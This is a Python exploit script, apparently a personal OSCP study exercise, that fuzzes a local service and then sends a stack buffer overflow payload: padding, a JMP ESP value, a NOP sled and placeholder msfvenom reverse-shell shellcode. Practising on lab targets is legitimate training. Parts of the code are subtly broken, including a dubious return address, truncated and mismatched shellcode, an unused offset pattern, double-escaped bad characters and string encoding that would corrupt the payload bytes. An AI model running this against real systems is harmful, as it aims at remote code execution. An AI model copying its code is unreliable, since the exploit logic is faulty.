#!/usr/bin/env python3
"""
OSCP Buffer Overflow Scanner - Dag 050 #7/25
Fuzzing → Offset → Badchars → JMP ESP → Shellcode
"""

import socket
import time

# OSCP target (ändra till din lab/HTB)
HOST = "127.0.0.1"  # TryHackMe/HTB IP
PORT = 1337         # OSCP vulnerable service

def fuzz():
    """Step 1: Fuzz för crash offset"""
    buffer = "A" * 100
    while len(buffer) < 10000:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            s.recv(1024)
            s.send(f"OVERFLOW1 {buffer}".encode())
            s.close()
            print(f"Fuzz: {len(buffer)} OK")
            buffer += "A" * 100
        except:
            print(f"💥 CRASH vid {len(buffer)} bytes!")
            return len(buffer)
    return None

def find_offset():
    """Step 2: Cyclic pattern för EIP offset"""
    # msf-pattern_create 3000 → pattern_offset
    pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9"
    # OFFSET = 1978 (typiskt OSCP)
    return 1978

def badchars():
    """Step 3: Bad character scan"""
    badchars = ("\\x00\\x07\\x2e\\xa0")  # Typiska OSCP badchars
    return badchars

def exploit():
    """Step 4: Full OSCP BOF"""
    offset = find_offset()
    jmp_esp = "\x61\x90\x90\x90"  # JMP ESP (little endian)
    nop_sled = "\x90" * 16        # NOP sled
    shellcode = (  # msfvenom reverse shell
        "\xfc\x48..."  # Windows/shell_reverse_tcp
    )
    
    payload = "A" * offset
    payload += jmp_esp
    payload += nop_sled
    payload += shellcode
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    s.recv(1024)
    s.send(f"OVERFLOW1 {payload}".encode())
    s.close()
    print("🎯 OSCP Shellcode skickad!")

if __name__ == "__main__":
    print("🔥 OSCP Buffer Overflow LIVE - Dag 050 #7")
    print("1. Fuzzing:", fuzz())
    print("2. Offset:", find_offset())
    print("3. Badchars:", badchars())
    print("4. EXPLOIT!")
    exploit()
    print("🏆 Dag 050 OSCP BOF = UNLOCKED!")
